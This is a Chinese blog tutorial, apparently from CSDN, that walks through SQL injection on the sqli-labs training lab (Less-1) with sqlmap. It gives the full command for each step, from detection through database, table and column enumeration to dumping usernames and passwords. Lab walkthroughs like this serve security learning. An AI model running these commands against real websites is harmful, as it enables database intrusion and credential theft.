# 原创
：  （sqlmap）【sqli-labs靶场1-4】GET请求、错误注入、单引号、双引号、括号闭合、字符型、整型

# （sqlmap）【sqli-labs靶场1-4】GET请求、错误注入、单引号、双引号、括号闭合、字符型、整型

**目录**

[（sqlmap）SQL注入基本步骤：](#SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A)

[扩展](#%E6%89%A9%E5%B1%95)

[命令扩展](#%E5%91%BD%E4%BB%A4%E6%89%A9%E5%B1%95)

[注：](#%E6%B3%A8%EF%BC%9A)

[推荐：](#%C2%A0%E6%8E%A8%E8%8D%90%EF%BC%9A)

[一、Less1（GET-Error based - Single quotes -String）](#%E4%B8%80%E3%80%81Less1%EF%BC%88GET-Error%20based%20-%20Single%20quotes%20-String%EF%BC%89)

[1.1、第一步：检测是否存在注入](#%C2%A0%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5)

[基础操作](#%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C)

[1.2、第二步：爆数据库名](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D)

[命令](#%E5%91%BD%E4%BB%A4)

[基础操作](#%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C)

[1.3、第三步：爆数据库表名](#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%90%8D)

[命令](#%E5%91%BD%E4%BB%A4)

[基础操作](#%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C)

[1.4、第四步：爆字段名](#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5%E5%90%8D)

[命令：](#%E5%91%BD%E4%BB%A4%EF%BC%9A)

[基础操作](#%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C)

[1.5、第五步：爆数据](#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

[命令：](#%E5%91%BD%E4%BB%A4%EF%BC%9A)

[基础操作：](#%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%EF%BC%9A)

---


---


 

> 
<h2>（sqlmap）SQL注入基本步骤：</h2>
第一步：检测是否存在注入
第二步：爆数据库名
第三步：爆数据库表名
第四步：爆字段名
第五步：爆数据


---


> 
<h2>扩展</h2>
<h3>命令扩展</h3>
（1）如果提前找到了数据库类型
--dbms +数据库
（2）扫描的等级
最高等级是
--leve=5 --risk=3
<hr/>
<h3>注：</h3>
我使用Windows中的sqlmap做，会带上python sqlmap.py
Linux：直接sqlmap +……
<hr/>
<h3>推荐：</h3>
[（手工）【sqli-labs靶场1-4】GET请求、错误注入、单引号、双引号、括号闭合、字符型、整型<img alt="icon-default.png?t=M4AD" src="https://csdnimg.cn/release/blog_editor_html/release2.1.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M4AD"/>https://blog.csdn.net/qq_53079406/article/details/124964170?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/124964170?spm=1001.2014.3001.5501)



### 注：

---


---


---


## 一、Less1（GET-Error based - Single quotes -String）

> 
<h3>1.1、第一步：检测是否存在注入</h3>
<h4>基础操作</h4>
python sqlmap.py -u 'http://localhost:8080/sqli-labs-master/Less-1/?id=1' --batch
--batch是使用默认设置



其实环境都扫出来了 
就可以再加上--dbms mysql了



> 
<h3>1.2、第二步：爆数据库名</h3>
<h4>命令</h4>
#获取全部数据库
sqlmap.py -u url --dbs --batch
---------
#获取当前数据库
sqlmap.py -u url --current-dbs --batch
<hr/>
<h4>基础操作</h4>
python sqlmap.py -u 'http://localhost:8080/sqli-labs-master/Less-1/?id=1' --dbs --batch

 <img alt="" height="785" src="https://img-blog.csdnimg.cn/b8d25742b69842c9b9935c6a62e2bb85.png" width="1200"/>



#### 基础操作

> 
<h3>1.3、第三步：爆数据库表名</h3>
<h4>命令</h4>
python sqlmap.py -u url -D DB --tables --batch
<hr/>
<h4>基础操作</h4>
python sqlmap.py -u 'http://localhost:8080/sqli-labs-master/Less-1/?id=1' -D security --tables --batch

 <img alt="" height="785" src="https://img-blog.csdnimg.cn/109e73bdd8284fc09941090a4d487d07.png" width="1200"/>



#### 基础操作

> 
<h3>1.4、第四步：爆字段名</h3>
<h4>命令：</h4>
sqlmap.py -u url -D DB -T TBL --columns --batch

<h4>基础操作</h4>
python sqlmap.py -u 'http://localhost:8080/sqli-labs-master/Less-1/?id=1' -D security -T users  --columns --batch





#### 基础操作

> 
<h3>1.5、第五步：爆数据</h3>
<h4>命令：</h4>
sqlmap.py -u url -D DB -T TBL -C "COL1,COL2" --dump --batch
<hr/>
<h4>基础操作：</h4>
python sqlmap.py -u 'http://localhost:8080/sqli-labs-master/Less-1/?id=1' -D security -T users  -C "username,password" --dump --batch

 <img alt="" height="785" src="https://img-blog.csdnimg.cn/5a45f0d259d545d7b673ce8d23a6eee0.png" width="1200"/>



#### 基础操作：

---


注：

(1-4关基本类似，就以第一关为例)
